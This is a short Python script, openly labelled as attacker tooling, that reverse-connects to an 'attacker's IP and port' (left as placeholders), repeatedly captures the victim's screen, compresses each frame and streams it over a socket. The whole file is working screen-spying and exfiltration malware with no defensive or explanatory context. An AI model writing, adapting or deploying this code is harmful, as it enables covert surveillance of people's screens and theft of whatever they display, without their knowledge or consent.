import socket
import struct
import pickle
import cv2
import mss
import numpy as np

# Attacker's IP and Port
HOST = PLACEHOLDER_IP 
PORT = PLACEHOLDER_PORT  

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((HOST, PORT))  # Reverse connect to the attacker

print(f"[+] Connected")

sct = mss.mss()

while True:
    screenshot = sct.grab(sct.monitors[1])  # Capture screen
    frame = np.array(screenshot)
    frame = cv2.resize(frame, (800, 450))  # Resize 
    _, buffer = cv2.imencode('.png', frame, [cv2.IMWRITE_JPEG_QUALITY, 60])  # Compress

    data = pickle.dumps(buffer)  # Serialize
    message = struct.pack("Q", len(data)) + data  # Pack data size + frame

    try:
        client.sendall(message)  # Send to attacker
    except:
        break

client.close()
